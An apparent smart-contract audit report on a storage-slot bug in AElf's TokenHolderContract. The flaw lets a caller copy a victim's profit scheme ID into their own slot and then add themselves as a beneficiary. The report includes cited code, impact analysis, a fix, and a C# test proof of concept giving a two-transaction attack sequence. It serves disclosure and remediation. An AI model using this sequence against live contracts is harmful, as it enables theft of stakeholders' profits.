# Audit Report

## Title
State Corruption in UpdateTokenHolderProfitScheme Enables Unauthorized Scheme Manipulation and Fund Theft

## Summary
The `UpdateTokenHolderProfitScheme` helper function in TokenHolderContract contains a critical state corruption bug where it writes scheme data to `Context.Sender`'s storage slot instead of the `manager` parameter's slot. This allows any attacker to hijack a victim's scheme ID and exploit TokenHolderContract's privileged relationship with ProfitContract to add malicious beneficiaries and steal accumulated profits.

## Finding Description

**Root Cause:**

The `UpdateTokenHolderProfitScheme` function queries ProfitContract using the `manager` parameter to retrieve the correct SchemeId, but then incorrectly saves the updated scheme to `Context.Sender`'s storage slot instead of the `manager`'s slot. [1](#0-0) 

**Correct Pattern Demonstrated Elsewhere:**

Both `DistributeProfits` and `RegisterForProfits` correctly use the manager parameter when persisting scheme updates: [2](#0-1) [3](#0-2) 

**Vulnerable Execution Path:**

1. When an attacker calls `ContributeProfits` with `input.SchemeManager` pointing to a victim's address: [4](#0-3) 

2. `GetValidScheme` loads the victim's scheme and calls `UpdateTokenHolderProfitScheme`: [5](#0-4) 

3. The update logic queries ProfitContract using the victim's address as manager to retrieve the correct SchemeId, then saves it to the attacker's storage slot (line 298).

**Why Authorization Protections Fail:**

The ProfitContract's `AddBeneficiary` method trusts TokenHolderContract as a privileged system contract: [6](#0-5) 

Once the attacker has the victim's SchemeId stored in their own storage slot, they can call `AddBeneficiary`: [7](#0-6) 

The ProfitContract allows this modification because the call originates from TokenHolderContract (a trusted system contract), despite the attacker having no legitimate authorization over the victim's scheme.

## Impact Explanation

**Direct Fund Theft:**
- Attackers can add themselves as beneficiaries with arbitrarily large shares to any victim's TokenHolder profit scheme
- Attackers can claim all accumulated profits meant for legitimate stakeholders
- Impact scales with total profits accumulated in victim schemes (potentially millions of tokens)

**Share Dilution:**
- Legitimate beneficiaries receive proportionally reduced profits based on attacker's injected shares
- Scheme managers permanently lose control over beneficiary authorization

**State Corruption:**
- Victim's scheme metadata never gets updated properly (SchemeId remains null/outdated)
- Repeated exploitation creates inconsistent scheme copies across multiple attacker storage slots
- Creates DoS scenarios when victims attempt legitimate scheme operations

**Affected Parties:**
- DApp operators who create TokenHolder profit schemes for user rewards
- Token stakers and legitimate beneficiaries expecting profit distributions
- Any scheme with accumulated profits becomes an immediate target

## Likelihood Explanation

**Attacker Capabilities Required:**
- Ability to call public contract functions (standard blockchain capability)
- Knowledge of target scheme manager address (publicly observable from transaction logs)
- Minimal token holdings for the initial ContributeProfits call (as low as 1 token)

**Attack Complexity:**
- Simple 2-transaction attack sequence:
  1. Call `ContributeProfits(schemeManager: VictimAddress, amount: 1, symbol: "ELF")`
  2. Call `AddBeneficiary(beneficiary: AttackerAddress, shares: 1000000000)`
- No timing constraints, race conditions, or complex state manipulation required
- Deterministic outcome with 100% success rate

**Economic Incentives:**
- Attack cost: 1 token + transaction gas fees (negligible)
- Attack reward: Proportional share of all accumulated profits in victim's scheme (unlimited upside)
- Risk-adjusted ROI: Extremely favorable for attackers

**Detection Constraints:**
- No on-chain indicators distinguish malicious ContributeProfits from legitimate contributions
- State corruption occurs silently; victims only discover upon auditing beneficiary lists

## Recommendation

Fix the `UpdateTokenHolderProfitScheme` function to write to the correct storage slot:

```csharp
private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
    bool updateSchemePeriod)
{
    if (scheme.SchemeId != null && !updateSchemePeriod) return;
    var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
    {
        Manager = manager
    }).SchemeIds.FirstOrDefault();
    Assert(originSchemeId != null, "Origin scheme not found.");
    var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
    scheme.SchemeId = originScheme.SchemeId;
    scheme.Period = originScheme.CurrentPeriod;
    State.TokenHolderProfitSchemes[manager] = scheme;  // FIX: Use 'manager' instead of 'Context.Sender'
}
```

## Proof of Concept

```csharp
[Fact]
public async Task StateCorruption_SchemeHijack_ProofOfConcept()
{
    // Setup: Victim creates a TokenHolder scheme
    var victimStub = GetTokenHolderContractTester(UserKeyPairs[0]);
    await victimStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 100
    });
    
    var victimAddress = UserAddresses[0];
    
    // Verify victim's scheme is initially empty (SchemeId is null)
    var victimScheme = await victimStub.GetScheme.CallAsync(victimAddress);
    victimScheme.SchemeId.ShouldBeNull();
    
    // Attack Step 1: Attacker calls ContributeProfits targeting victim's scheme
    var attackerStub = GetTokenHolderContractTester(StarterKeyPair);
    await attackerStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = victimAddress,  // Target victim's scheme
        Symbol = "ELF",
        Amount = 1
    });
    
    // Verify state corruption: Attacker now has victim's SchemeId in their storage
    var attackerScheme = await attackerStub.GetScheme.CallAsync(Starter);
    attackerScheme.SchemeId.ShouldNotBeNull();  // Attacker stole victim's SchemeId
    
    // Verify victim's scheme was NOT updated (still null)
    victimScheme = await victimStub.GetScheme.CallAsync(victimAddress);
    victimScheme.SchemeId.ShouldBeNull();  // Victim's storage unchanged
    
    // Attack Step 2: Attacker adds themselves as beneficiary using stolen SchemeId
    await attackerStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = Starter,  // Attacker's address
        Shares = 1000000
    });
    
    // Verify exploit: Attacker is now beneficiary of victim's scheme in ProfitContract
    var profitDetails = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = attackerScheme.SchemeId,  // This is victim's SchemeId
        Beneficiary = Starter  // Attacker's address
    });
    
    profitDetails.Details.Count.ShouldBeGreaterThan(0);  // Attacker successfully added
    profitDetails.Details[0].Shares.ShouldBe(1000000);   // With arbitrary shares
    
    // Victim's profits are now compromised - attacker can claim them
}
```

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L37-67)
```csharp
    public override Empty AddBeneficiary(AddTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);
        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
        var shares = input.Shares;
        if (detail.Details.Any())
        {
            // Only keep one detail.

            State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
            {
                SchemeId = scheme.SchemeId,
                Beneficiary = input.Beneficiary
            });
            shares.Add(detail.Details.Single().Shares);
        }

        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = input.Beneficiary,
                Shares = shares
            }
        });
        return new Empty();
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L100-102)
```csharp
    public override Empty ContributeProfits(ContributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager);
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L145-145)
```csharp
        State.TokenHolderProfitSchemes[input.SchemeManager] = scheme;
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L205-205)
```csharp
            State.TokenHolderProfitSchemes[input.SchemeManager] = scheme;
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L278-284)
```csharp
    private TokenHolderProfitScheme GetValidScheme(Address manager, bool updateSchemePeriod = false)
    {
        var scheme = State.TokenHolderProfitSchemes[manager];
        Assert(scheme != null, "Token holder profit scheme not found.");
        UpdateTokenHolderProfitScheme(ref scheme, manager, updateSchemePeriod);
        return scheme;
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L286-299)
```csharp
    private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
        bool updateSchemePeriod)
    {
        if (scheme.SchemeId != null && !updateSchemePeriod) return;
        var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
        {
            Manager = manager
        }).SchemeIds.FirstOrDefault();
        Assert(originSchemeId != null, "Origin scheme not found.");
        var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
        scheme.SchemeId = originScheme.SchemeId;
        scheme.Period = originScheme.CurrentPeriod;
        State.TokenHolderProfitSchemes[Context.Sender] = scheme;
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L171-174)
```csharp
        Assert(
            Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager can add beneficiary.");
```
